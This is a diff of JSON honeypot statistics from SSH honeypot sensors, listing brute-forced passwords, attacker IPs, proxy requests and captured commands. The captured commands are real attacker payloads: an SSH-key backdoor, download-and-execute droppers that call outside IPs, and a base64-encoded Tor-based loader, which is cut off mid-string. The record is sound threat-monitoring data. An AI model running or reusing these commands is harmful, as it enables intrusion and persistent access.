       "src_ip": "222.92.139.158",
-      "count": 1,
-      "date": "2021-05-05",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "filename": "dota3.tar.gz",
       "src_ip": "167.172.207.139",
-      "count": 1,
-      "date": "2021-05-05",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -824,25 +622,19 @@
       "src_ip": "5.188.86.206",
       "dst_ip": "96.114.157.80",
       "dst_port": 25,
-      "count": 1361,
-      "date": "2021-05-05",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1361
     },
     {
       "src_ip": "5.188.86.206",
       "dst_ip": "68.87.20.5",
       "dst_port": 25,
-      "count": 1298,
-      "date": "2021-05-05",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1298
     },
     {
       "src_ip": "45.227.255.163",
       "dst_ip": "chek.zennolab.com",
       "dst_port": 80,
-      "count": 909,
-      "date": "2021-05-05",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 909
     }
   ]
 },
@@ -853,109 +645,79 @@
     {
       "username": "root",
       "password": "1234",
-      "count": 19559,
-      "date": "2021-06-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 19559
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 731,
-      "date": "2021-06-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 731
     },
     {
       "username": "root",
       "password": "fuckyou",
-      "count": 25,
-      "date": "2021-06-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 25
     }
   ],
   "commands": [
     {
       "input": "uname -a",
-      "count": 742,
-      "date": "2021-06-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 742
     },
     {
       "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-      "count": 740,
-      "date": "2021-06-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 740
     },
     {
       "input": "cat /proc/cpuinfo | grep name | wc -l",
-      "count": 740,
-      "date": "2021-06-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 740
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 738,
-      "date": "2021-06-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 738
     },
     {
       "input": "cat /etc/issue; hive-passwd wazg0d1s23",
-      "count": 4,
-      "date": "2021-06-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 4
     },
     {
       "input": "wget -qO - http://71.127.148.69/.x/2sh | sh > /dev/null 2>&1 &",
-      "count": 1,
-      "date": "2021-06-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.87.51",
       "dst_port": 2222,
-      "count": 1495,
-      "date": "2021-06-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1495
     },
     {
       "src_ip": "5.188.86.207",
       "dst_port": 2222,
-      "count": 1367,
-      "date": "2021-06-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1367
     },
     {
       "src_ip": "5.188.87.60",
       "dst_port": 2222,
-      "count": 1141,
-      "date": "2021-06-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1141
     }
   ],
   "session_closed": [
     {
       "src_ip": "5.188.87.51",
       "robot": true,
-      "count": 1045,
-      "date": "2021-06-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1045
     },
     {
       "src_ip": "5.188.86.207",
       "robot": true,
-      "count": 966,
-      "date": "2021-06-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 966
     },
     {
       "src_ip": "5.188.86.167",
       "robot": true,
-      "count": 943,
-      "date": "2021-06-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 943
     }
   ],
   "file_download": [
@@ -966,9 +728,7 @@
         "positives": 26,
         "total": 59
       },
-      "count": 1,
-      "date": "2021-06-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -976,25 +736,19 @@
       "src_ip": "45.227.255.163",
       "dst_ip": "www.google.ru",
       "dst_port": 443,
-      "count": 7179,
-      "date": "2021-06-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 7179
     },
     {
       "src_ip": "78.128.113.150",
       "dst_ip": "video-weaver.ord03.hls.ttvnw.net",
       "dst_port": 443,
-      "count": 1984,
-      "date": "2021-06-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1984
     },
     {
       "src_ip": "45.227.255.163",
       "dst_ip": "184.150.200.206",
       "dst_port": 443,
-      "count": 1862,
-      "date": "2021-06-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1862
     }
   ]
 },
@@ -1005,69 +759,51 @@
     {
       "username": "root",
       "password": "abc1234",
-      "count": 6,
-      "date": "2021-03-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 6
     },
     {
       "username": "mysql",
       "password": "admin",
-      "count": 5,
-      "date": "2021-03-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 5
     },
     {
       "username": "test123",
       "password": "test123",
-      "count": 5,
-      "date": "2021-03-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 5
     }
   ],
   "connect": [
     {
       "src_ip": "49.88.112.72",
       "dst_port": 2222,
-      "count": 572,
-      "date": "2021-03-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 572
     },
     {
       "src_ip": "68.183.189.30",
       "dst_port": 2222,
-      "count": 50,
-      "date": "2021-03-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 50
     },
     {
       "src_ip": "211.144.221.226",
       "dst_port": 2222,
-      "count": 50,
-      "date": "2021-03-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 50
     }
   ],
   "session_closed": [
     {
       "src_ip": "49.88.112.72",
       "robot": false,
-      "count": 354,
-      "date": "2021-03-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 354
     },
     {
       "src_ip": "49.88.112.72",
       "robot": true,
-      "count": 217,
-      "date": "2021-03-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 217
     },
     {
       "src_ip": "68.183.189.30",
       "robot": true,
-      "count": 50,
-      "date": "2021-03-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 50
     }
   ]
 },
@@ -1078,109 +814,79 @@
     {
       "username": "root",
       "password": "admin",
-      "count": 17455,
-      "date": "2021-03-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 17455
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 981,
-      "date": "2021-03-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 981
     },
     {
       "username": "root",
       "password": "123",
-      "count": 911,
-      "date": "2021-03-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 911
     }
   ],
   "commands": [
     {
       "input": "cat /proc/cpuinfo | grep name | wc -l",
-      "count": 1001,
-      "date": "2021-03-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1001
     },
     {
       "input": "uname -a",
-      "count": 997,
-      "date": "2021-03-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 997
     },
     {
       "input": "uname -m",
-      "count": 996,
-      "date": "2021-03-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 996
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 993,
-      "date": "2021-03-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 993
     },
     {
       "input": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://109.104.151.108/LjEZs/uYtea.x86_64; curl -O http://109.104.151.108/LjEZs/uYtea.x86;cat uYtea.x86 >kzpold ;chmod +x *;./kzpold Exploit.x86_64; tftp 109.104.151.108 -c get uYtea.x86; chmod 777 uYtea.x86; ./uYtea.x86 Exploit.x86_64; rm -rf *",
-      "count": 16,
-      "date": "2021-03-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 16
     },
     {
       "input": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://51.75.191.234/sh; curl -O http://51.75.191.234/sh; chmod 777 sh; sh sh; tftp 51.75.191.234 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 51.75.191.234; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 51.75.191.234 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *",
-      "count": 8,
-      "date": "2021-03-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 8
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.86.221",
       "dst_port": 2222,
-      "count": 1093,
-      "date": "2021-03-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1093
     },
     {
       "src_ip": "5.188.86.210",
       "dst_port": 2222,
-      "count": 1033,
-      "date": "2021-03-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1033
     },
     {
       "src_ip": "5.188.87.57",
       "dst_port": 2222,
-      "count": 953,
-      "date": "2021-03-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 953
     }
   ],
   "session_closed": [
     {
       "src_ip": "5.188.86.221",
       "robot": true,
-      "count": 927,
-      "date": "2021-03-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 927
     },
     {
       "src_ip": "5.188.87.57",
       "robot": true,
-      "count": 764,
-      "date": "2021-03-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 764
     },
     {
       "src_ip": "5.188.86.169",
       "robot": true,
-      "count": 725,
-      "date": "2021-03-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 725
     }
   ],
   "file_download": [
@@ -1191,9 +897,7 @@
         "positives": 38,
         "total": 62
       },
-      "count": 2,
-      "date": "2021-03-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 2
     },
     {
       "url": "http://51.75.191.234/sh",
@@ -1202,9 +906,7 @@
         "positives": 25,
         "total": 50
       },
-      "count": 1,
-      "date": "2021-03-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -1212,25 +914,19 @@
       "src_ip": "45.227.255.163",
       "dst_ip": "www.google.ru",
       "dst_port": 443,
-      "count": 12711,
-      "date": "2021-03-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 12711
     },
     {
       "src_ip": "5.182.39.61",
       "dst_ip": "i.instagram.com",
       "dst_port": 443,
-      "count": 1615,
-      "date": "2021-03-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 1615
     },
     {
       "src_ip": "185.232.67.40",
       "dst_ip": "omegle.com",
       "dst_port": 80,
-      "count": 943,
-      "date": "2021-03-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 943
     }
   ]
 },
@@ -1241,109 +937,79 @@
     {
       "username": "root",
       "password": "1234",
-      "count": 18229,
-      "date": "2021-05-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 18229
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 1454,
-      "date": "2021-05-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1454
     },
     {
       "username": "root",
       "password": "12345678",
-      "count": 32,
-      "date": "2021-05-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 32
     }
   ],
   "commands": [
     {
       "input": "uname -a",
-      "count": 1575,
-      "date": "2021-05-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1575
     },
     {
       "input": "cat /proc/cpuinfo | grep name | wc -l",
-      "count": 1489,
-      "date": "2021-05-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1489
     },
     {
       "input": "which ls",
-      "count": 1488,
-      "date": "2021-05-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1488
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 1479,
-      "date": "2021-05-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1479
     },
     {
       "input": "uname -a",
-      "count": 88,
-      "date": "2021-05-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 88
     },
     {
       "input": "nproc; uname -a",
-      "count": 12,
-      "date": "2021-05-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 12
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.86.178",
       "dst_port": 2222,
-      "count": 1180,
-      "date": "2021-05-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1180
     },
     {
       "src_ip": "5.188.87.51",
       "dst_port": 2222,
-      "count": 1099,
-      "date": "2021-05-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1099
     },
     {
       "src_ip": "5.188.87.60",
       "dst_port": 2222,
-      "count": 1095,
-      "date": "2021-05-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1095
     }
   ],
   "session_closed": [
     {
       "src_ip": "5.188.87.51",
       "robot": true,
-      "count": 896,
-      "date": "2021-05-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 896
     },
     {
       "src_ip": "5.188.86.167",
       "robot": true,
-      "count": 863,
-      "date": "2021-05-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 863
     },
     {
       "src_ip": "5.188.86.178",
       "robot": true,
-      "count": 859,
-      "date": "2021-05-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 859
     }
   ],
   "file_download": [
@@ -1354,9 +1020,7 @@
         "positives": null,
         "total": null
       },
-      "count": 1,
-      "date": "2021-05-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": null,
@@ -1365,9 +1029,7 @@
         "positives": null,
         "total": null
       },
-      "count": 1,
-      "date": "2021-05-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": null,
@@ -1376,32 +1038,24 @@
         "positives": null,
         "total": null
       },
-      "count": 1,
-      "date": "2021-05-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "file_upload": [
     {
       "filename": "dota3.tar.gz",
       "src_ip": "111.161.74.112",
-      "count": 4,
-      "date": "2021-05-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 4
     },
     {
       "filename": "dota3.tar.gz",
       "src_ip": "181.23.91.156",
-      "count": 1,
-      "date": "2021-05-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "filename": "dota.tar.gz",
       "src_ip": "27.1.253.142",
-      "count": 1,
-      "date": "2021-05-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -1409,25 +1063,19 @@
       "src_ip": "5.188.87.51",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 896,
-      "date": "2021-05-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 896
     },
     {
       "src_ip": "5.188.86.167",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 864,
-      "date": "2021-05-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 864
     },
     {
       "src_ip": "5.188.86.178",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 860,
-      "date": "2021-05-10",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 860
     }
   ]
 },
@@ -1438,109 +1086,79 @@
     {
       "username": "root",
       "password": "1234",
-      "count": 11002,
-      "date": "2021-05-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 11002
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 790,
-      "date": "2021-05-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 790
     },
     {
       "username": "root",
       "password": "12345678",
-      "count": 27,
-      "date": "2021-05-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 27
     }
   ],
   "commands": [
     {
       "input": "uname -a",
-      "count": 821,
-      "date": "2021-05-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 821
     },
     {
       "input": "lscpu | grep Model",
-      "count": 816,
-      "date": "2021-05-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 816
     },
     {
       "input": "uname",
-      "count": 816,
-      "date": "2021-05-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 816
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 814,
-      "date": "2021-05-13",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 814
     },
     {
       "input": "echo WFJBTkRPTQpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZnVuY3Rpb24ga3VybCgpIHsKICByZWFkIHByb3RvIHNlcnZlciBwYXRoIDw8PCQoZWNobyAkezEvLy8vIH0pCiAgRE9DPS8ke3BhdGgvLyAvL30KICBIT1NUPSR7c2VydmVyLy86Kn0KICBQT1JUPSR7c2VydmVyLy8qOn0KICBbWyB4IiR7SE9TVH0iID09IHgiJHtQT1JUfSIgXV0gJiYgUE9SVD04MAoKICBleGVjIDM8Pi9kZXYvdGNwLyR7SE9TVH0vJFBPUlQKICBlY2hvIC1lbiAiR0VUICR7RE9DfSBIVFRQLzEuMFxyXG5Ib3N0OiAke0hPU1R9XHJcblxyXG4iID4mMwogICh3aGlsZSByZWFkIGxpbmU7IGRvCiAgIFtbICIkbGluZSIgPT0gJCdccicgXV0gJiYgYnJlYWsKICBkb25lICYmIGNhdCkgPCYzCiAgZXhlYyAzPiYtCn0KCnJtIC1mICRIT01FL3NzCmN1cmwgLVYgfHwgd2dldCAtcSBodHRwczovL2dpdGh1Yi5jb20vbW9wYXJpc3RoZWJlc3Qvc3RhdGljLWN1cmwvcmVsZWFzZXMvZG93bmxvYWQvdjcuNzUuMC9jdXJsLWFtZDY0IC1PICRIT01FL2N1cmw7Y2htb2QgK3ggJEhPTUUvY3VybApjdXJsIC1WIHx8IGt1cmwgaHR0cDovLzEzOS41OS4xNTAuNzo0NDMvY3VybCA+ICRIT01FL2N1cmw7Y2htb2QgK3ggJEhPTUUvY3VybApzcyAtdiAgIHx8IGt1cmwgaHR0cDovLzEzOS41OS4xNTAuNzo0NDMvc3MgICA+ICRIT01FL3NzO2NobW9kICt4ICRIT01FL3NzCnNzIC12ICAgfHwgY3VybCAtcyBodHRwOi8vMTM5LjU5LjE1MC43OjQ0My9zcyAtbyAkSE9NRS9zcztjaG1vZCAreCAkSE9NRS9zcwpwcyAgICAgIHx8IGN1cmwgLXMgaHR0cDovLzEzOS41OS4xNTAuNzo0NDMvcHMgLW8gJEhPTUUvcHM7Y2htb2QgK3ggJEhPTUUvcHMKCmQ9JChncmVwIHg6JChpZCAtdSk6IC9ldGMvcGFzc3dkfGN1dCAtZDogLWY2KQpjPSQoZWNobyAiY3VybCAtNGZzU0xrQS0gLW0yMDAiKQp0PSQoZWNobyAicnhteHB6Zmt5ZGt1bGhocW51ZnRibWY2ZDVxNjdqamNob3BtaDRvZnN6Znd3bm16NGJxcTJmaWQiKQoKc29ja3ooKSB7Cm49KGRvaC5ubC5haGFkbnMubmV0IGRucy5ob3N0dXgubmV0IHVuY2Vuc29yZWQubHV4MS5kbnMubml4bmV0Lnh5eiBkbnMucnVieWZpc2guY24gZG5zLnR3bmljLnR3IGRvaC5uby5haGFkbnMubmV0IGRvaC1maS5ibGFoZG5zLmNvbSBmaS5kb2guZG5zLnNub3B5dGEub3JnIHJlc29sdmVyLWV1LmxlbHV4LmZpIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyAiZG5zLXF1ZXJ5P25hbWU9cmVsYXkudG9yMnNvY2tzLmluIikKcz0kKCRjIGh0dHBzOi8vJHtuWyQoKFJBTkRPTSUxMSkpXX0vJHAgfCBncmVwIC1vRSAiXGIoWzAtOV17MSwzfVwuKXszfVswLTldezEsM31cYiIgfHRyICcgJyAnXG4nfGdyZXAgLUV2IFsuXTB8c29ydCAtdVJ8aGVhZCAtbiAxKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAuICRIT01FIC91c3IvYmluICRkIC90bXAgL3Zhci90bXAgO2RvIGVjaG8gZXhpdCA+ICRpL2kgJiYgY2htb2QgK3ggJGkvaSAmJiBjZCAkaSAmJiAuL2kgJiYgcm0gLWYgaSAmJiBicmVhaztkb25lCn0KCnUoKSB7CnNvY2t6CmY9L3NoLiQodW5hbWUgLW0pCng9Li8kKGRhdGV8bWQ1c3VtfGN1dCAtZjEgLWQtKQpyPSQoY3VybCAtNGZzU0xrIGNoZWNraXAuYW1hem9uYXdzLmNvbXx8Y3VybCAtNGZzU0xrIGlwLnNiKV8kKHdob2FtaSlfJCh1bmFtZSAtbSlfJCh1bmFtZSAtbilfJChpcCBhfGdyZXAgJ2luZXQgJ3xhd2sgeydwcmludCAkMid9fG1kNXN1bXxhd2sgeydwcmludCAkMSd9KV8kKGNyb250YWIgLWx8YmFzZTY0IC13MCkKJGMgLXggc29ja3M1aDovLyRzOjkwNTAgJHQub25pb24kZiAtbyR4IC1lJHIgfHwgJGMgJDEkZiAtbyR4IC1lJHIKY2htb2QgK3ggJHg7JHg7cm0gLWYgJHgKfQoKZm9yIGggaW4gdG9yMndlYi5pbiB0b3Iyd2ViLml0IHRvcjJ3ZWIuc3UKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCmZleGU7dSAkdC4kaApscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvdG1wO3UgJHQuJGgpCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXM